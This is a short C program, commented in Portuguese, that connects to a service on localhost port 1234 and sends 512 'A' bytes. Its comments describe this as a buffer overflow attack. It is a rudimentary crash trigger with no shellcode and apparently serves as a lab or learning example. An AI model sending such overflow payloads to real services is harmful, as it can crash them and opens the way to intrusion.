#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

#define TARGET_IP "127.0.0.1" // IP do alvo
#define TARGET_PORT 1234       // Porta do alvo

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[512]; // Buffer de 512 bytes

    // Criar socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Configurar o endereço do servidor
    server.sin_family = AF_INET;
    server.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &server.sin_addr);

    // Conectar ao alvo
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connection failed");
        return 1;
    }

    // Preencher o buffer com 'A' até o limite do buffer
    memset(buffer, 'A', sizeof(buffer));

    // O objetivo aqui é sobrescrever a memória do programa alvo
    // Enviar o buffer (este é o ataque de buffer overflow)
    send(sock, buffer, sizeof(buffer), 0);
    
    printf("Payload enviado para %s:%d\n", TARGET_IP, TARGET_PORT);
    close(sock);

    return 0;
}
